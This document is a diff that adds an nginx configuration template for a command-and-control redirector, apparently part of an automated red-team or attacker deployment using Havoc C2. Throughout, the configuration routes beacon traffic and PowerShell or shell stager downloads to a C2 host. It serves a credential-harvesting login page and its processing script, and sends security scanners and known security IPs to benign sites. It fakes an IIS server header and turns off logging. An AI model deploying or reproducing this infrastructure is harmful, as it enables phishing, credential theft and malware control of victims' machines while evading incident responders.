@@ -1,0 +1,143 @@
+# Shared redirector behaviour: included by every server block that serves
+# the redirector hostname. Rendered to /etc/nginx/snippets/redirector-site.conf
+    # Advanced IR Evasion - IMPORTANT: Order matters!
+    
+    # 1. Direct mobile users to credential capture - placed first to ensure it takes priority
+    if ($is_mobile = 1) {
+        return 302 https://$host/login/auth.html;
+    }
+    
+    # 2. Redirect security tools to benign sites
+    if ($is_security_tool) {
+        return 302 https://www.google.com;
+    }
+    
+    # 3. Redirect known security IPs
+    if ($is_known_security_ip) {
+        return 302 https://www.microsoft.com;
+    }
+    
+    # 4. Add timing delay for suspicious connections
+    if ($http_referer ~* (security|scan)) {
+        set $delay_response 1;
+    }
+    
+    # Valid C2 beacon routing - CRITICAL PATHS
+    location ~ ^/api/beacon/ {
+        # Only valid beacons proceed to C2
+        proxy_pass https://{{ c2_ip }}:{{ havoc_https_port | default(9443) }};
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_ssl_verify off;
+        
+        # Implement artificial delay for suspicious connections
+        if ($delay_response) {
+            limit_rate 1k;  # Slow down response
+        }
+    }
+    
+    # Secure stager delivery routes
+    location ~ ^/(windows|linux)_stager\.(ps1|sh)$ {
+        # Only valid requests that passed the earlier checks
+        proxy_pass http://{{ c2_ip }}:8443/$1_stager.$2;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+    
+    # Content access for payload delivery
+    location ~ ^/content/(windows|linux)/(.+)$ {
+        # Specific valid content paths
+        proxy_pass http://{{ c2_ip }}:8443/content/$1/$2;
+        proxy_http_version 1.1;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+
+    # Secure payload delivery path for synced payloads
+    location /resources/ {
+        alias /var/www/resources/;
+        limit_except GET { deny all; }
+        add_header X-Content-Type-Options "nosniff" always;
+        add_header Content-Security-Policy "default-src 'none'" always;
+        add_header X-Frame-Options "DENY" always;
+        add_header Server "Microsoft-IIS/10.0" always;
+        autoindex off;
+        access_log off;
+    }
+    
+    # Credential harvesting login page
+    location ~ ^/login/auth\.html$ {
+        root /var/www;
+        try_files $uri =404;
+        add_header X-Frame-Options "DENY" always;
+    }
+    
+    # Protect credential processing script
+    location ~ ^/login/process\.php$ {
+        # Allow POST only
+        limit_except POST { deny all; }
+        
+        # Process the PHP file
+        root /var/www;
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php-fpm.sock;
+    }
+
+    # Block direct access to sensitive files
+    location ~ \.(enc|key|pem|log)$ {
+        deny all;
+        return 404;
+    }
+    
+    {% if setup_integrated_tracker | default(false) | bool %}
+    # Email tracker pixel only (not exposing dashboard)
+    location ~ ^/px/(.+)\.png$ {
+        proxy_pass https://{{ c2_ip }}/pixel/$1.png;
+        proxy_http_version 1.1;
+        proxy_ssl_verify off;
+        proxy_ssl_server_name on;
+        proxy_ssl_name {{ tracker_domain }};
+        proxy_set_header Host {{ tracker_domain }};
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-Proto https;
+        
+        # Cache control for tracking pixels
+        add_header Cache-Control "no-store, no-cache, must-revalidate" always;
+        expires -1;
+    }
+    {% endif %}
+    
+    # Primary location for legitimate website traffic
+    # This acts as a catch-all for non-matching URIs
+    location / {
+        # Check if this is potentially an attempt to access a non-existent payload
+        if ($request_uri ~* \.(exe|dll|ps1|sh|py|vbs|hta)$) {
+            # If invalid payload URI, redirect to real target
+            return 302 https://www.{{ domain }};
+        }
+        
+        # Otherwise serve legitimate content
+        try_files $uri $uri/ =404;
+    }
+
+    # Security headers
+    add_header X-Content-Type-Options "nosniff" always;
+    add_header X-Frame-Options "SAMEORIGIN" always;
+    add_header X-XSS-Protection "1; mode=block" always;
+    add_header Referrer-Policy "no-referrer" always;
+    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;" always;
+    
+    # Make server appear as IIS
+    add_header Server "Microsoft-IIS/10.0";
+    
+    # Disable logging
+    {% if zero_logs | default(true) | bool %}
+    access_log off;
+    error_log /dev/null crit;
+    {% endif %}
